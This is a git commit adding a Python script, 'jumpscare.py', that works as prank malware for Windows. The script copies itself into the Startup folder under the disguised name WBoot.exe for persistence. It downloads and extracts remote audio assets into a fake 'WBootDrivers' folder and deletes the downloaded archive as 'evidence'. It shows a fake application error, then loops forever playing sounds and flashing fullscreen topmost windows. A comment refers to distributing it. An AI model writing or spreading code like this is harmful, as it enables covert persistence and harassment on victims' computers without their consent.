181959192694f096bf08a6f6950bfc4f7de233a6
Enderbyte09 <83879635+Enderbyte09@users.noreply.github.com>
2022-09-26 17:55:23 -0700

    Add files via upload

---
+++ jumpscare.py
@@ -0,0 +1,83 @@
+import os
+import urllib.request
+import keyboard
+import shutil
+from tkinter import messagebox, Tk
+import zipfile
+from playsound import playsound
+from time import sleep
+import random
+import threading
+
+def getforceddir():
+    return os.getenv("APPDATA") + "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
+    
+def isalreadyrooted():
+    if os.path.isfile(getforceddir()+"\\WBoot.exe"):
+        return True
+    else:
+        return False
+
+def writeforcefir():
+    shutil.copy(__file__,getforceddir()+"\\WBoot.exe")
+
+def install():
+    print("Program NOT installed. Installing.")
+    print("Copying data")
+    writeforcefir()
+    print("Downloading")
+    urllib.request.urlretrieve("https://github.com/Enderbyte-Programs/Other/raw/main/JSoundAssets.zip",".assets.zip")
+    try:
+        os.mkdir("C:\\WBootDrivers")
+    except:
+        pass
+    print("Extracting")
+    with zipfile.ZipFile(".assets.zip","r") as zf:
+        zf.extractall("C:\\WBootDrivers")
+    print("Rmoving evidence")
+    os.remove(".assets.zip")
+
+def playjumpscare():
+    playsound("C:\\WBootDrivers\\SysSoundStart1.mp3")
+
+def jumpscare():
+    print("JUMPSCARE")
+    root = Tk()
+    root.attributes("-fullscreen",True)
+    root.wm_attributes("-topmost",True)
+    threading.Thread(target=playjumpscare).start()
+    for i in range(10):
+    
+        root["bg"] = "black"
+        root.update()
+        sleep(0.1)
+        root["bg"] = "white"
+        root.update()
+        sleep(0.1)
+        root["bg"] = "red"
+        root.update()    
+        sleep(0.1)
+    root.destroy()
+    del root
+
+def rjumptimer():
+    print("Beginning The Pain")
+    while True:
+        #sleep(random.randint(60,600)/10)#REMOVE /10 BEFORE DISTROBUTION
+        print("Doing stuff")
+        playsound(random.choice(["C:\\WBootDrivers\\AudioCore.mp3","C:\\WBootDrivers\\WSSBoot.mp3"]))
+        if random.randint(5,5) == 5:
+            jumpscare()
+
+def main():
+    installed = isalreadyrooted()
+    if installed and os.path.isdir("C:\\WBootDrivers"):
+        print("Program is already installed")
+    else:
+        install()
+    __r = Tk()
+    __r.withdraw()
+    messagebox.showerror("Application Error","An error occured in your application.")
+    rjumptimer()
+    
+main()
